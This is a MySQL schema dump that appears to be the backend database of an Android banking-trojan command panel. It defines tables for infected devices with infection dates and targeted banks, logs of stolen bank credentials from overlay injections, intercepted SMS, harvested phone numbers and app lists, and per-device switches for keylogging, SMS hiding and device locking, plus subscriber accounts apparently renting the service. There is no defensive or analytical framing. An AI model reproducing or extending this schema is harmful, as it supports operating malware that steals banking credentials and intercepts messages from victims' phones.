SET TIME_ZONE = "+00:00";

DROP TABLE IF EXISTS `User`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `User` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `role` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'user',
  `tag` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'ALL',
  `permissions` varchar(191) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0000000',
  PRIMARY KEY (`id`),
  UNIQUE KEY `User_username_key` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `bots`
--

DROP TABLE IF EXISTS `bots`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `bots` (
  `id_key` int unsigned NOT NULL AUTO_INCREMENT,
  `idbot` varchar(50) NOT NULL,
  `ip` varchar(30) DEFAULT NULL,
  `operator` varchar(100) DEFAULT NULL,
  `phoneNumber` varchar(50) DEFAULT NULL,
  `model` varchar(100) DEFAULT NULL,
  `android` varchar(15) NOT NULL,
  `TAG` varchar(50) DEFAULT NULL,
  `country` varchar(15) DEFAULT NULL,
  `lastconnect` varchar(20) DEFAULT NULL,
  `date_infection` varchar(20) DEFAULT NULL,
  `commands` varchar(4000) DEFAULT NULL,
  `banks` varchar(1500) DEFAULT NULL,
  `comment` varchar(3500) DEFAULT NULL,
  `statProtect` varchar(3) DEFAULT NULL,
  `statScreen` varchar(3) DEFAULT NULL,
  `statAccessibility` varchar(3) DEFAULT NULL,
  `statSMS` varchar(3) DEFAULT NULL,
  `statCards` varchar(3) DEFAULT NULL,
  `statBanks` varchar(3) DEFAULT NULL,
  `statMails` varchar(3) DEFAULT NULL,
  `activeDevice` varchar(254) DEFAULT NULL,
  `timeWorking` varchar(254) DEFAULT NULL,
  `statDownloadModule` varchar(3) DEFAULT NULL,
  `statAdmin` varchar(3) DEFAULT '1',
  `updateSettings` varchar(3) DEFAULT '1',
  `locale` varchar(10) DEFAULT NULL,
  `batteryLevel` varchar(10) DEFAULT NULL,
  `statUnknownInstall` varchar(3) DEFAULT NULL,
  `statExternal` varchar(3) DEFAULT NULL,
  `statDrawOver` varchar(3) DEFAULT NULL,
  `statAutoAdmin` int DEFAULT 0,
  PRIMARY KEY (`id_key`)
) ENGINE=InnoDB AUTO_INCREMENT=571 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `logsBank`
--

DROP TABLE IF EXISTS `logsBank`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `logsBank` (
  `id` int NOT NULL AUTO_INCREMENT,
  `idinj` varchar(50) NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `application` varchar(100) NOT NULL,
  `logs` varchar(3000) NOT NULL,
  `comment` varchar(2000) DEFAULT NULL,
  `tag` varchar(50) NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=62 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `logsBotsSMS`
--

DROP TABLE IF EXISTS `logsBotsSMS`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `logsBotsSMS` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `idbot` varchar(50) NOT NULL,
  `logs` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `logsListApplications`
--

DROP TABLE IF EXISTS `logsListApplications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `logsListApplications` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `idbot` varchar(50) DEFAULT NULL,
  `logs` longtext,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=53 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `logsPhoneNumber`
--

DROP TABLE IF EXISTS `logsPhoneNumber`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `logsPhoneNumber` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `idbot` varchar(50) NOT NULL,
  `logs` longtext NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `settingBots`
--

DROP TABLE IF EXISTS `settingBots`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `settingBots` (
  `id` int unsigned NOT NULL AUTO_INCREMENT,
  `idbot` varchar(30) NOT NULL,
  `hideSMS` varchar(3) DEFAULT '1',
  `lockDevice` varchar(3) DEFAULT NULL,
  `offSound` varchar(3) DEFAULT NULL,
  `keylogger` varchar(3) NOT NULL DEFAULT '1',
  `activeInjection` varchar(3000) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=430 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `settings` (
  `saveID` varchar(30) DEFAULT NULL,
  `arrayUrl` varchar(1500) DEFAULT NULL,
  `timeInject` varchar(25) DEFAULT NULL,
  `timeCC` varchar(25) DEFAULT NULL,
  `timeMail` varchar(25) DEFAULT NULL,
  `timeProtect` varchar(25) DEFAULT NULL,
  `updateTableBots` varchar(5) DEFAULT NULL,
  `pushTitle` varchar(70) DEFAULT NULL,
  `pushText` varchar(400) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `privatekey` varchar(255) NOT NULL,
  `contact` varchar(255) DEFAULT NULL,
  `serverinfo` varchar(255) DEFAULT NULL,
  `domain` varchar(255) DEFAULT NULL,
  `apicryptkey` varchar(255) DEFAULT NULL,
  `other` varchar(255) DEFAULT NULL,
  `end_subscribe` date DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;
